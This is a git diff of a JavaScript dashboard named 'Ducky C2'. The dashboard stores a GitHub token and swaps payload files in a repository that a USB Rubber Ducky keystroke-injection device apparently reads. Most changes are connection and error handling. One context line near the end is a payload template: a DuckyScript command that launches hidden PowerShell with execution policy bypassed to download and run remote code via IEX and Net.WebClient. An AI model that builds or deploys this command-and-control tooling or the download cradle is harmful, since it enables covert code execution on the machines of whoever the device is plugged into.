@@ -23,7 +23,7 @@ const elements = {
 let state = {
     token: localStorage.getItem('ducky_token') || '',
     repo: localStorage.getItem('ducky_repo') || '',
-    targetFile: localStorage.getItem('ducky_target') || 'payload.txt' // The file the Ducky actually reads
+    targetFile: localStorage.getItem('ducky_target') || 'payload.txt'
 };
 
 // Initialization
@@ -31,9 +31,12 @@ function init() {
     if (state.token && state.repo) {
         elements.repoName.value = state.repo;
         elements.token.value = state.token;
-        showDashboard();
+        // Don't auto-show, let them click connect to verify again or just show login
+        // Actually, let's try to auto-connect silently
+        testConnection(state.repo, state.token).then(success => {
+            if (success) showDashboard();
+        });
     }
-
     setupEventListeners();
 }
 
@@ -41,18 +44,29 @@ function setupEventListeners() {
     elements.connectBtn.addEventListener('click', async () => {
         const repo = elements.repoName.value.trim();
         const token = elements.token.value.trim();
+        const btn = elements.connectBtn;
 
         if (!repo || !token) {
             alert('Please enter both Repo Name and Token');
             return;
         }
 
-        // Test Connection
-        if (await testConnection(repo, token)) {
-            saveCredentials(repo, token);
-            showDashboard();
-        } else {
-            alert('Connection Failed. Check credentials and permissions.');
+        btn.innerText = 'CONNECTING...';
+        btn.disabled = true;
+
+        try {
+            const result = await testConnection(repo, token);
+            if (result.success) {
+                saveCredentials(repo, token);
+                showDashboard();
+            } else {
+                alert(`CONNECTION FAILED:\n${result.error}\n\nCheck your Token permissions (Repo: Read/Write) and Repo Name.`);
+            }
+        } catch (e) {
+            alert('System Error: ' + e.message);
+        } finally {
+            btn.innerText = 'INITIALIZE_CONNECTION';
+            btn.disabled = false;
         }
     });
 
@@ -73,12 +87,10 @@ function setupEventListeners() {
         setTimeout(() => elements.copyBtn.innerText = originalText, 2000);
     });
 
-    // Tab Switching
     elements.tabBtns.forEach(btn => {
         btn.addEventListener('click', () => {
             elements.tabBtns.forEach(b => b.classList.remove('active'));
             elements.tabContents.forEach(c => c.classList.add('hidden'));
-            
             btn.classList.add('active');
             document.getElementById(btn.dataset.tab).classList.remove('hidden');
         });
@@ -90,45 +102,51 @@ async function testConnection(repo, token) {
     try {
         const response = await fetch(`${API_BASE}/repos/${repo}`, {
             headers: {
-                'Authorization': `token ${token}`,
+                'Authorization': `Bearer ${token}`, // Changed to Bearer for better PAT support
                 'Accept': 'application/vnd.github.v3+json'
             }
         });
-        return response.ok;
+
+        if (response.ok) {
+            return { success: true };
+        } else {
+            return { success: false, error: `${response.status} ${response.statusText}` };
+        }
     } catch (e) {
-        console.error(e);
-        return false;
+        return { success: false, error: e.message };
     }
 }
 
 async function loadFiles() {
     elements.fileList.innerHTML = '<div class="loading">LOADING_FILES...</div>';
-    
+
     try {
         const response = await fetch(`${API_BASE}/repos/${state.repo}/contents`, {
             headers: {
-                'Authorization': `token ${state.token}`,
+                'Authorization': `Bearer ${state.token}`,
                 'Accept': 'application/vnd.github.v3+json'
             }
         });
-        
-        if (!response.ok) throw new Error('Failed to load files');
-        
+
+        if (!response.ok) {
+            const err = await response.json();
+            throw new Error(err.message || response.statusText);
+        }
+
         const files = await response.json();
         renderFiles(files);
     } catch (e) {
-        elements.fileList.innerHTML = `<div class="error">ERROR: ${e.message}</div>`;
+        elements.fileList.innerHTML = `<div class="terminal-output" style="color: var(--accent)">ERROR: ${e.message}</div>`;
     }
 }
 
 async function updateFile(path, content, message = 'Update payload via Ducky C2') {
     try {
-        // First get the current SHA
         let sha = '';
         try {
             const current = await fetch(`${API_BASE}/repos/${state.repo}/contents/${path}`, {
                 headers: {
-                    'Authorization': `token ${state.token}`,
+                    'Authorization': `Bearer ${state.token}`,
                     'Accept': 'application/vnd.github.v3+json'
                 }
             });
@@ -136,31 +154,32 @@ async function updateFile(path, content, message = 'Update payload via Ducky C2'
                 const data = await current.json();
                 sha = data.sha;
             }
-        } catch (e) {
-            // File might not exist yet, which is fine
-        }
+        } catch (e) { }
 
         const body = {
             message: message,
-            content: btoa(content), // Base64 encode
-            branch: 'main' // Assuming main branch
+            content: btoa(content),
+            branch: 'main'
         };
-        
+
         if (sha) body.sha = sha;
 
         const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/${path}`, {
             method: 'PUT',
             headers: {
-                'Authorization': `token ${state.token}`,
+                'Authorization': `Bearer ${state.token}`,
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify(body)
         });
 
-        if (!response.ok) throw new Error('Failed to write file');
-        
+        if (!response.ok) {
+            const err = await response.json();
+            throw new Error(err.message || response.statusText);
+        }
+
         alert(`SUCCESS: Wrote to ${path}`);
-        loadFiles(); // Refresh list
+        loadFiles();
     } catch (e) {
         alert(`ERROR: ${e.message}`);
     }
@@ -177,11 +196,13 @@ function showDashboard() {
 
 function renderFiles(files) {
     elements.fileList.innerHTML = '';
-    
+
+    if (!Array.isArray(files)) return;
+
     files.filter(f => f.type === 'file').forEach(file => {
         const card = document.createElement('div');
         card.className = 'file-card';
-        
+
         const isTarget = file.name === state.targetFile;
         if (isTarget) card.classList.add('active');
 
@@ -206,21 +227,19 @@ function saveCredentials(repo, token) {
 }
 
 // Logic Functions
-window.activatePayload = async function(filename) {
+window.activatePayload = async function (filename) {
     if (!confirm(`Overwrite ${state.targetFile} with content of ${filename}?`)) return;
 
     try {
-        // Read source file
         const response = await fetch(`${API_BASE}/repos/${state.repo}/contents/${filename}`, {
             headers: {
-                'Authorization': `token ${state.token}`,
+                'Authorization': `Bearer ${state.token}`,
                 'Accept': 'application/vnd.github.v3+json'
             }
         });
         const data = await response.json();
-        const content = atob(data.content); // Decode Base64
+        const content = atob(data.content);
 
-        // Write to target file
         await updateFile(state.targetFile, content, `Activated ${filename}`);
     } catch (e) {
         alert('Error activating payload: ' + e.message);
@@ -237,3 +256,6 @@ STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object Net.WebClie
 ENTER
     `.trim();
 }
+
+// Start
+init();
